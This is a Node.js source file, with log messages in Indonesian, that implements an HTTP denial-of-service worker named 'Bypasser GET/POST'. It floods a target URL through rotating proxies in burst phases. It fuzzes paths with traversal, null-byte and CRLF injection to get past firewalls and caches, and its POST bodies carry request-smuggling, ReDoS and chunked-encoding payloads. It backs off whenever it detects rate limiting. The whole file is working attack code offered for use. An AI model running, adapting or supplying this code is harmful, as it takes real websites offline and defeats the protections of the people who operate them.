const axios = require('axios');
const url = require('url');
const crypto = require('crypto');
const { PassThrough } = require('stream');
const { setTimeout: sleep } = require('timers/promises');
const { getRandomPayload, proxyList, getAxiosOptions } = require('./extensions');

async function sendChunkedPost(url, payloadString, options) {
    const stream = new PassThrough();
    delete options.headers['Content-Length'];
    options.headers['Transfer-Encoding'] = 'chunked';

    const requestPromise = axios.post(url, stream, options);

    try {
        const numChunks = 5 + Math.floor(Math.random() * 10);
        const chunkSize = Math.ceil(payloadString.length / numChunks);
        
        for (let i = 0; i < payloadString.length; i += chunkSize) {
            const chunk = payloadString.substring(i, i + chunkSize);
            if (chunk.length > 0) stream.write(chunk);
            await sleep(10 + Math.random() * 100); 
        }
    } finally {
        stream.end();
    }
    return requestPromise;
}

function generateRedosPayload(length = 25) {
    return 'a'.repeat(length) + 'c';
}

function runHttpAttack(targetUrl, durationSeconds, attackType) {
    const isPostAttack = attackType === 'post';
    const attackName = isPostAttack ? "Bypasser POST" : "Bypasser GET";
    let localSent = 0;
    let localError = 0;
    const target = url.parse(targetUrl);
    const controller = new AbortController();

    let attackState = {
        phase: 'RAMP_UP',
        phaseEndTime: Date.now() + (2000 + Math.random() * 2000),
        streams: 50,
    };
    const ORIGINAL_MAX_STREAMS = 250;
    const MIN_STREAMS = 25;

    let limiterScore = 0;
    let isCoolingDown = false;
    const LIMITER_THRESHOLD = 20;
    const LIMITER_SCORE_DECAY = 0.75;

    const HEAP_SAFE_LIMIT_MB = 800;
    const HEAP_SAFE_LIMIT_BYTES = HEAP_SAFE_LIMIT_MB * 1024 * 1024;
    let currentMaxStreams = ORIGINAL_MAX_STREAMS;

    const memoryMonitor = setInterval(() => {
        const heapUsed = process.memoryUsage().heapUsed;
        if (heapUsed > HEAP_SAFE_LIMIT_BYTES) {
            const oldLimit = Math.floor(currentMaxStreams);
            currentMaxStreams = Math.max(MIN_STREAMS, currentMaxStreams * 0.85);
            if (Math.floor(currentMaxStreams) < oldLimit) {
                console.warn(`Worker ${process.pid} memory high (${(heapUsed / 1024 / 1024).toFixed(0)}MB). Throttling streams to ${Math.floor(currentMaxStreams)}.`);
            }
        }
    }, 2500);

    const commonPaths = ['/api/v2/user', '/login', '/shop/item', '/search', '/wp-admin', '/blog/post', '/auth/login', '/api/v3/data'];
    const commonParams = ['q', 'id', 'search', 'page', 'user', 'query', 'token', 'session', 'key'];

    console.log(`Worker ${process.pid} memulai serangan ${attackName} ke ${target.host} selama ${durationSeconds} detik.`);

    let isAttackActive = true;
    let activeRequests = 0;

    const fuzzUrl = (originalUrl) => {
        let finalUrl = originalUrl;
        const fuzzChoice = Math.random();
        const urlObj = new url.URL(originalUrl);

        if (fuzzChoice < 0.1) {
            const fakePath = commonPaths[Math.floor(Math.random() * commonPaths.length)];
            urlObj.pathname = fakePath;
            finalUrl = urlObj.href;
        } else if (fuzzChoice < 0.2) {
            const fakeParam = commonParams[Math.floor(Math.random() * commonParams.length)];
            urlObj.searchParams.append(fakeParam, crypto.randomBytes(8).toString('hex'));
            if (Math.random() < 0.3) {
                urlObj.searchParams.append(fakeParam, crypto.randomBytes(8).toString('hex'));
            }
            finalUrl = urlObj.href;
        } else if (fuzzChoice < 0.3) {
            let pathSegments = urlObj.pathname.split('/').filter(Boolean);
            if (pathSegments.length > 1) {
                const injectIndex = 1 + Math.floor(Math.random() * (pathSegments.length - 1));
                pathSegments.splice(injectIndex, 0, crypto.randomBytes(4).toString('hex'));
                urlObj.pathname = '/' + pathSegments.join('/');
                finalUrl = urlObj.href;
            }
        } else if (fuzzChoice < 0.4) {
            if (urlObj.pathname.length > 1) {
                urlObj.pathname = urlObj.pathname.replace('/', '//');
                finalUrl = urlObj.href;
            }
        } else if (fuzzChoice < 0.5) {
            if (urlObj.pathname.length > 1) {
                urlObj.pathname += '/../';
                finalUrl = urlObj.href;
            }
        } else if (fuzzChoice < 0.6) {
            urlObj.hash = crypto.randomBytes(4).toString('hex');
            finalUrl = urlObj.href;
        } else if (fuzzChoice < 0.7) {
            urlObj.pathname = urlObj.pathname.split('').map(char => 
                /[a-zA-Z]/.test(char) ? (Math.random() > 0.5 ? char.toUpperCase() : char.toLowerCase()) : char
            ).join('');
            finalUrl = urlObj.href;
        } else if (fuzzChoice < 0.8) {
            urlObj.pathname = urlObj.pathname.split('').map(char => 
                /[a-zA-Z]/.test(char) && Math.random() < 0.3 ? '%' + char.charCodeAt(0).toString(16) : char
            ).join('');
            finalUrl = urlObj.href;
        } else if (fuzzChoice < 0.85) {
            if (urlObj.pathname.length > 3) {
                const path = urlObj.pathname;
                const injectIndex = 1 + Math.floor(Math.random() * (path.length - 2));
                const injection = ['%00', '%0d', '%0a', '%09'][Math.floor(Math.random() * 4)];
                urlObj.pathname = path.slice(0, injectIndex) + injection + path.slice(injectIndex);
                finalUrl = urlObj.href;
            }
        }

        if (Math.random() < 0.05) {
            const redosParam = commonParams[Math.floor(Math.random() * commonParams.length)];
            const urlObjForRedos = new url.URL(finalUrl);
            urlObjForRedos.searchParams.append(redosParam, generateRedosPayload());
            finalUrl = urlObjForRedos.href;
        }

        const cacheBustingParam = `_=${crypto.randomBytes(6).toString('hex')}`;
        return finalUrl + (finalUrl.includes('?') ? '&' : '?') + cacheBustingParam;
    };

    const attack = () => {
        activeRequests++;
        localSent++;

        const finalUrl = fuzzUrl(targetUrl);
        const proxyUrl = proxyList.length > 0 ? proxyList[Math.floor(Math.random() * proxyList.length)] : undefined;
        const options = getAxiosOptions(target, proxyUrl, controller.signal);

        const onComplete = () => {
            activeRequests--;
        };
        const onError = (error) => {
            if (axios.isCancel(error)) {
                return;
            }
            localError++; // Count every error

            // Log a small sample of errors for visibility without flooding the console
            if (Math.random() < 0.01) { // Log ~1% of errors
                if (error.response) {
                    console.warn(`Worker ${process.pid} sample error: HTTP ${error.response.status}`);
                } else if (error.request) {
                    console.warn(`Worker ${process.pid} sample error: Network ${error.code}`);
                } else {
                    console.error(`Worker ${process.pid} sample error: Setup ${error.message}`);
                }
            }

            // Adjust limiter score based on error type for self-throttling
            if (error.response) {
                if (error.response.status === 429) { // Too Many Requests
                    limiterScore += 5;
                } else if (error.response.status >= 500) { // Server-side errors
                    limiterScore += 3;
                }
            } else if (error.request) { // Network errors (timeout, etc.)
                limiterScore += 1;
            }
        };

        if (isPostAttack) {
            if (Math.random() < 0.1) {
                const { payload } = getRandomPayload();
                options.headers['X-HTTP-Method-Override'] = 'POST';
                const overrideMethods = ['OPTIONS', 'PUT', 'PATCH'];
                axios.request({
                    url: finalUrl,
                    method: overrideMethods[Math.floor(Math.random() * overrideMethods.length)],
                    headers: options.headers,
                    data: payload,
                    timeout: options.timeout,
                    signal: options.signal,
                    validateStatus: options.validateStatus,
                    proxy: options.proxy
                }).catch(onError).finally(onComplete);
                return;
            }

            const { payload, type } = getRandomPayload();
            let dataString;
            
            if (type === 'json') {
                payload[`_${crypto.randomBytes(4).toString('hex')}`] = crypto.randomBytes(8).toString('hex');
                dataString = JSON.stringify(payload);
                options.headers['Content-Type'] = 'application/json';
            } else {
                payload.append(`_${crypto.randomBytes(4).toString('hex')}`, crypto.randomBytes(8).toString('hex'));
                dataString = payload.toString();
                options.headers['Content-Type'] = 'application/x-www-form-urlencoded';
            }

            const techniqueChoice = Math.random();
            if (techniqueChoice < 0.10) {
                const padding = crypto.randomBytes(4096 + Math.floor(Math.random() * 4096)).toString('hex');
                dataString = padding + dataString;
            } else if (techniqueChoice < 0.15) {
                const charsets = ['UTF-16', 'UTF-16BE', 'UTF-32'];
                const chosenCharset = charsets[Math.floor(Math.random() * charsets.length)];
                options.headers['Content-Type'] = `${options.headers['Content-Type']}; charset=${chosenCharset}`;
            } else if (techniqueChoice < 0.20) {
                options.headers['Transfer-Encoding'] = 'chunked';
                const smuggledRequest = `\r\n\r\nGET /?bypassed=1 HTTP/1.1\r\nHost: ${target.hostname}\r\nFoo: bar\r\n\r\n`;
                dataString += smuggledRequest;
            } else if (techniqueChoice < 0.25) {
                if (type === 'json') {
                    const obj = JSON.parse(dataString);
                    obj.redos_field = generateRedosPayload(50);
                    dataString = JSON.stringify(obj);
                } else {
                    dataString += `&redos_field=${encodeURIComponent(generateRedosPayload(50))}`;
                }
            } else if (techniqueChoice < 0.30) {
                const boundary = `----WebKitFormBoundary${crypto.randomBytes(16).toString('hex')}`;
                const manipulatedBoundary = boundary.slice(0, 20) + ' ' + boundary.slice(20);
                options.headers['Content-Type'] = `multipart/form-data; boundary=${manipulatedBoundary}`;
            } else if (techniqueChoice < 0.35) { // Chunked Mismatch Simulation
                if (dataString.length > 20) {
                    const injectIndex = 10 + Math.floor(Math.random() * (dataString.length - 20));
                    const fakeChunk = `\r\n${(5 + Math.floor(Math.random() * 10)).toString(16)}\r\n${crypto.randomBytes(5 + Math.floor(Math.random() * 10)).toString('hex')}\r\n`;
                    dataString = dataString.slice(0, injectIndex) + fakeChunk + dataString.slice(injectIndex);
                }
            } else if (techniqueChoice < 0.40) { // Whitespace in body
                if (type === 'form' && dataString.includes('=')) {
                    const injections = ['\r', '\n', '\t', String.fromCharCode(0x0B)]; // CR, LF, TAB, VT
                    dataString = dataString.replace('=', `=${injections[Math.floor(Math.random() * injections.length)]}`);
                }
            }

            if (Math.random() < 0.15) {
                options.headers['Content-Type'] = type === 'json' ? 'application/x-www-form-urlencoded' : 'application/json';
            }

            if (Math.random() < 0.4) {
                sendChunkedPost(finalUrl, dataString, options).catch(onError).finally(onComplete);
            } else {
                axios.post(finalUrl, dataString, options).catch(onError).finally(onComplete);
            }
        } else {
            axios.get(finalUrl, options).catch(onError).finally(onComplete);
        }
    };

    const attackLoop = () => {
        if (!isAttackActive) return;

        if (!isCoolingDown && limiterScore > LIMITER_THRESHOLD) {
            isCoolingDown = true;
            const cooldownDuration = 5000 + Math.random() * 5000;
            console.warn(`Worker ${process.pid} detected rate limiting (score: ${limiterScore}). Entering ${Math.round(cooldownDuration / 1000)}s cooldown.`);

            attackState.phase = 'PAUSE';
            attackState.streams = MIN_STREAMS + Math.floor(Math.random() * 10);
            
            setTimeout(() => {
                console.log(`Worker ${process.pid} finished cooldown. Resuming attack.`);
                limiterScore = 0;
                isCoolingDown = false;
                attackState.phase = 'RAMP_UP';
                attackState.phaseEndTime = Date.now() + 1000;
            }, cooldownDuration);
        }

        if (isCoolingDown) {
            while (isAttackActive && activeRequests < MIN_STREAMS) {
                attack();
            }
            setTimeout(attackLoop, 100);
            return;
        }

        if (Date.now() > attackState.phaseEndTime) {
            switch (attackState.phase) {
                case 'RAMP_UP':
                    attackState.phase = 'BURST';
                    attackState.phaseEndTime = Date.now() + (6000 + Math.random() * 7000);
                    break;
                case 'BURST':
                    attackState.phase = Math.random() > 0.5 ? 'PAUSE' : 'RAMP_DOWN';
                    attackState.phaseEndTime = Date.now() + (1000 + Math.random() * 2000);
                    break;
                case 'PAUSE':
                case 'RAMP_DOWN':
                    attackState.phase = 'RAMP_UP';
                    attackState.phaseEndTime = Date.now() + (2000 + Math.random() * 2000);
                    break;
            }
        }

        switch (attackState.phase) {
            case 'RAMP_UP':
                attackState.streams = Math.min(currentMaxStreams, attackState.streams + 25);
                break;
            case 'BURST':
                attackState.streams = currentMaxStreams;
                break;
            case 'PAUSE':
                attackState.streams = MIN_STREAMS;
                break;
            case 'RAMP_DOWN':
                attackState.streams = Math.max(MIN_STREAMS, attackState.streams - 25);
                break;
        }

        while (isAttackActive && activeRequests < attackState.streams) {
            attack();
        }

        setTimeout(attackLoop, 50);
    };

    const statsInterval = setInterval(() => {
        if (limiterScore > 0) {
            limiterScore = Math.floor(limiterScore * LIMITER_SCORE_DECAY);
        }

        if (process.send) {
            process.send({ type: 'stats', sent: localSent, error: localError });
        }
        localSent = 0;
        localError = 0;
    }, 5000);

    attackLoop();

    setTimeout(() => {
        isAttackActive = false;
        console.log(`Worker ${process.pid} menghentikan serangan dan membatalkan permintaan yang sedang berjalan...`);
        controller.abort();
        clearInterval(memoryMonitor);
        clearInterval(statsInterval);

        if (process.send && (localSent > 0 || localError > 0)) {
            process.send({ type: 'stats', sent: localSent, error: localError });
        }

        console.log(`Worker ${process.pid} telah menghentikan serangan ${attackName} ke ${target.host}.`);
        setTimeout(() => {
            process.exit(0);
        }, 500);
    }, durationSeconds * 1000);
}

module.exports = { runHttpAttack };